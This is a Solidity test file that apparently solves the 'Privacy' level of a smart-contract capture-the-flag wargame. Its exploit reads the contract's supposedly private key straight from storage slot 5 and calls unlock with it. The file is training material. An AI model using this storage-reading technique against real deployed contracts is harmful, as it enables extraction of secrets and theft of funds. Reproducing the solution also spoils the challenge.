// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Privacy.sol";
import "src/levels/PrivacyFactory.sol";

contract TestPrivacy is BaseTest {
    Privacy private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PrivacyFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = Privacy(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.locked(), true);
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // As in Vault, privacy is not real on blockchain.
        // Here it is more complicated to read from Privacy since this challange involve more knowledge about storage layout.
        // Privacys data is a fixed size array, and previios declaration are packed into 3 slots, therefore we need to read the 5 slot to get the key.

        vm.startPrank(player, player);

        // Get the key and convert it to bytes16
        bytes32 key = vm.load(address(level), bytes32(uint256(5)));
        bytes16 realKey = bytes16(key);

        // Unclock
        level.unlock(realKey);

        vm.stopPrank();
    }
}
